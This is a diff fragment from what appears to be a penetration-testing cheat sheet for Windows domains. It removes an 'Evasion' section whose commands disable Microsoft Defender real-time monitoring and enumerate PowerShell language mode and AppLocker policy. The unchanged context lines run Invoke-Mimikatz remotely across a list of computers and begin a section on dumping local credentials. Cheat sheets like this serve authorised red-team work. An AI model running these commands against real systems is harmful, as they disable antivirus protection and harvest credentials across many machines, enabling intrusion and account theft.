@@ -29,22 +29,6 @@ Invoke-Command -Scriptblock ${function:<function>} -Computername (Get-Content co
 Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content computers.txt)
 ```
 
-## Evasion
-#### Disable AV monitoring
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
-#### Check the language mode
-```
-$ExecutionContext.SessionState.LanguageMode
-```
-
-#### Enumerate applocker policy
-```
-Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
-
 ## Mimikatz
 #### Mimikatz dump credentials on local machine
 ```
